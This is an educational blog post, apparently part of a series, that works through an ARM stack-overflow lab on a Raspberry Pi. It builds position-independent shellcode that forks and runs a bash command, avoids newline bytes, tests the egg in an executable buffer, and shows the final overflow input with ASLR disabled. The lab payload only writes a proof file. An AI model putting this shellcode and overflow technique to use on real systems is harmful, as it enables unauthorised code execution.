---
layout: post
title: "Smashing ARM Stack for Fun - Part VI"
---

We have the same vulnerability than we have in
[stack4](/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-V.html)
but this time we will make our own egg/shellcode.<!--more-->


## Same vuln

```nasm
pwndbg> pdisass &main
 ► 0x1041c <main>       push   {fp, lr}
   0x10420 <main+4>     add    fp, sp, #4
   0x10424 <main+8>     sub    sp, sp, #0x48
   0x10428 <main+12>    str    r0, [fp, #-0x48]
   0x1042c <main+16>    str    r1, [fp, #-0x4c]
   0x10430 <main+20>    sub    r3, fp, #0x44
   0x10434 <main+24>    mov    r0, r3
   0x10438 <main+28>    bl     #gets@plt <gets@plt>

   0x1043c <main+32>    mov    r0, r3
   0x10440 <main+36>    sub    sp, fp, #4
   0x10444 <main+40>    pop    {fp, pc}
```

The plan is to overflow the buffer with 0x44 bytes of padding, then 4
bytes with the first return address.

Nothing new. But the fun is just about to begin...

## Planning the egg/exploit

We want something standard but slightly fancy:

 - spawn a shell an run an arbitrary command
 - wait for the spawned process to finish
 - exit the program

This translates to the following C code:

```cpp
#include <unistd.h>
void main() {
    pid_t child = fork();
    if (child == 0) {
        // child
        const char *argv[] = { "/bin/bash", "-c", "echo 'pwn!' > pwned_proof", NULL };
        const char *envp[] = { NULL };
        execve(argv[0], argv, envp);
    }
    else if (child != -1) {
        // parent
        wait4(child, NULL, 0, NULL);
    }
    // catch all exit
    exit_group(0);
}
```

The last `exit_group` is a catch all: if `fork` fails or `execve` fails
we want to have a deterministic output. The same for the parent process
after `wait4`.


## Syscalls

{% marginnote
'References: [w3challs](https://syscalls.w3challs.com/?arch=arm_strong)
and
[Linux kernel](https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl)
' %}

This is a summary of the syscalls' numbers and arguments:

```
            r7      r0      r1      r2      r3
syscall     num     arg1    arg2    arg3    argv4
fork        0x02
execve      0x0b    "/bi.." argv    envp
wait4       0x72    pid     NULL    0       NULL
exit_group  0xf8    num
```

`argv` and `envp`, are arrays of pointers with a
pointer to `NULL` marking the end of the array.

In Linux it is possible to pass a `NULL` instead an array with a single
pointer to `NULL`. This could be used for `envp`.

However:

> On Linux, `argv` and `envp` can be specified as `NULL`.  In both cases,
> this has the same effect as specifying  the  argument
> as  a  pointer to a list containing a single null pointer.
> **Do not take advantage of this nonstandard and nonportable misfeature!**
> On many other UNIX systems, specifying `argv`
> as NULL will result in an  error  (`EFAULT`). *Some*
> other UNIX systems treat the `envp==NULL` case the same as Linux.
> <cite class="epigraph">[man execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)</cite>


No problem! We can design a single array in the stack to fulfill both:

{% maincolumnditaa %}

sp             sp+4           sp+8           sp+12
 |              |              |              |
 +--------------+--------------+--------------+--------------+
 |    &argv0    |    &argv1    |    &argv2    |    &argv3    |  < stack
 +-------+------+-------+------+-------+------+----(zero)----+
         |              |              |
   /-----/            /-/      /-------/
   |                  |        |
   v                  v        v
  /bin/bash\x00       -c      echo 'pwn!'...
{% endmaincolumnditaa %}


In assembly this translates to:

```nasm
    mov r3, #0              @; &argv[3]
    add r2, pc, Largv2-.-8
    add r1, pc, Largv1-.-8
    add r0, pc, Largv0-.-8  @; &argv[0]
    push {r0-r3}
```

But why `add` and not `mov`?

## Position independent code

The exploit will be loaded in a piece of executable memory but we cannot
know *a priori* where.

Therefore, branches and addresses **must** be *relative* to the program
counter.

We cannot just say `mov r2, label` as we will hardcoding the address of
`label`; we need to use `add` and `pc`.

```nasm
00000020 <Lchild>:
  20:   e3a03000        mov     r3, #0
  24:   e28f204c        add     r2, pc, #76     ; 0x4c  argv2
  28:   e28f1044        add     r1, pc, #68     ; 0x44  argv1
  2c:   e28f0034        add     r0, pc, #52     ; 0x34  argv0
  30:   e92d000f        push    {r0, r1, r2, r3}
  34:   e28d1000        add     r1, sp, #0
  38:   e28d200c        add     r2, sp, #12
  3c:   e3a0700b        mov     r7, #11
  40:   ef000000        svc     0x00000000
        ....            ....

00000068 <Largv0>:
        ....            ....
00000074 <Largv1>:
        ....            ....
00000078 <Largv2>:
```

The `add` instructions like `add r2, pc, #76` makes the address relative
to the program counter.

To calculate the offset to a label like `Largv0` we need to subtract
the address of the label minus the current position minus 8 bytes
(because `pc` already has an implicit +0x8)

```python
    0x78 - 0x24 - 0x8 = 0x4c = 76
```

Thankfully the assembler can do the calculus by us:

```nasm
    add r2, pc, Largv2-.-8
```

And the branches?

`bne Lparent_or_error` is a *PC-relative* encoded jump: the program will jump
to that *absolute* address but the instruction is encoded as an *offset*
from the current `pc`.

In other words, we are **not** hardcoding a fixed address so our code
will work regardless of where is going to be loaded.

```nasm
00000000 <egg>:
   0:   e3a07002        mov     r7, #2
   4:   ef000000        svc     0x00000000
   8:   e3500000        cmp     r0, #0
   c:   1a000000        bne     14 <Lparent_or_error>
  10:   ea000002        b       20 <Lchild>
        ....            ....
00000020 <Lchild>:
  20:   e3a03000        mov     r3, #0
```

The address is computed as:

```python
    pc + offset * 4 + 8
```

The branch at 0x10 has the offset 0x02 encoded in the instruction
0xea000002. Knowing that the offset is multiplied by 4 (because the
addresses are aligned to 4 bytes; 2 in Thumb mode),
and knowing that using `pc` adds a 0x8 to the count
(0x4 in Thumb mode), the final address is:

```python
    0x10 + 0x2 * 4 + 0x8 = 0x20
```

Why did I use `bne` instead of `beq` ? Wouldn't that be more direct?

## Forbidden bytes

The vulnerable program will read our exploit using `gets`.

From the [man pages](https://man7.org/linux/man-pages/man3/gets.3.html),
`gets` reads from `stdin` until it finds a *termination character* or it
is the end of the stream.

In Linux, the new line (`\n` 0x0a) is the *termination character* so our
payload cannot have this byte or `gets` will stop in the middle of the copy.

For example the simple snippet is forbidden:

```nasm
    cmp r0, #0
    beq Lchild
    @; code for parent or error follows
```

{% marginnote
'Bypassing the filters can be incredible complex. Here is article about
[Alphanumeric RISC ARM Shellcode](https://web.archive.org/web/2020*/http://www.phrack.org/issues/66/12.html).
' %}

`beq` has a 0x0a as the first byte so we have to rewrite the snippet
to:

```nasm
    cmp r0, #0
    bne Lparent_or_error
    b Lchild
```


## Compilation

We compile the assembly into an object file with `gcc` (in a Raspbian)
and then we extract the `.text` section:

```shell
pi@raspberrypi:~$ gcc -c -o egg.o egg.s
pi@raspberrypi:~$ objcopy -O binary --only-section=.text egg.o egg.text
```

The assembly can be found [here](/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s).

## Testing

It is always a good idea to test the shellcode *separately* from the
exploitation.

For this [we can create a small C program](/book-of-gehn/assets/azeria-arm-challenges-assets/test-egg.c)
to load the *egg* from a file
into a buffer with *permission for execution* and then jump into it:

```cpp
    char *buf;

    posix_memalign(&buf, ALIGN, fsize);
    fread(buf, 1, fsize, f);
    mprotect(buf, fsize, PROT_READ|PROT_WRITE|PROT_EXEC);

    ((void(*)())buf)();
```

This is an example:

```shell
pi@raspberrypi:~$ ./test-egg egg.text
Egg loaded at 0x24000-0x2409
```

{% marginnote
'The `good` and `bad` labels were put by me. Sorry, `strace` is not so smart.
'%}

If the things don't result as expected, `strace` can be useful to
inspect what syscalls are being called and with which parameters:

```python
pi@raspberrypi:~$ strace -i ./test-egg egg.text
....
strace: Process 4959 attached <--- child process
execve("/bin/bash", [0x6e69622f, ..., 0x666f], 0x2407f) = -1 EFAULT (Bad address)
           ^            ^
         good          bad
```

## Search a home

Fortunately the stack is executable:

```nasm
pwndbg> vmmap
   0x10000    0x11000 r-xp     1000 0      /home/pi/stack5
   0x20000    0x21000 rwxp     1000 0      /home/pi/stack5
0xb6fcc000 0xb6fec000 r-xp    20000 0      /usr/lib/arm-linux-gnueabihf/ld-2.28.so
0xb6ffc000 0xb6ffe000 rwxp     2000 20000  /usr/lib/arm-linux-gnueabihf/ld-2.28.so
0xb6fff000 0xb7000000 r-xp     1000 0      [sigpage]
0xbefdf000 0xbf000000 rwxp    21000 0      [stack]
0xffff0000 0xffff1000 r-xp     1000 0      [vectors]
```

We can write the egg in the stack and then jump to it. The content
of the stack should be:

{% maincolumnditaa %}
                 sp points here after func returned
                 |
                 v                  ||
--- main --------+------ start --   ||
AAAAAAAAA  addr1 | XXXXXXX      ... || bottom
--- ^ ----- ^ ---+--- ^ ---------   ||
    |       |         |             ||
 padding    sp       egg
{% endmaincolumnditaa %}

`addr1` is `sp`. But what value is?

If we disable ASLR we can peek the value with a debugger: 0xbefffbb8

## The attack

```shell
pi@raspberrypi:~$ echo -ne 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8\xfb\xff\xbe' > exploit
pi@raspberrypi:~$ cat egg.text >> exploit

pi@raspberrypi:~$ rm -f pwned_proof

pi@raspberrypi:~$ setarch linux32 --addr-no-randomize /bin/bash

(aslr disabled) pi@raspberrypi:~$ cat exploit | ./stack5
(aslr disabled) pi@raspberrypi:~$ echo $?
0

(aslr disabled) pi@raspberrypi:~$ cat pwned_proof
pwn!
```

The assembly of the egg can be found [here](/book-of-gehn/assets/azeria-arm-challenges-assets/egg.s).

## Readings

 - [Developing StrongARM/Linux shellcode](https://web.archive.org/web/2020*/http://www.phrack.org/issues/58/10.html#article)
 - [Introduction to ROP on Arm32](https://azeria-labs.com/return-oriented-programming-arm32/)
 - [Introduction to Writing ARM Shellcode](https://azeria-labs.com/writing-arm-shellcode/)

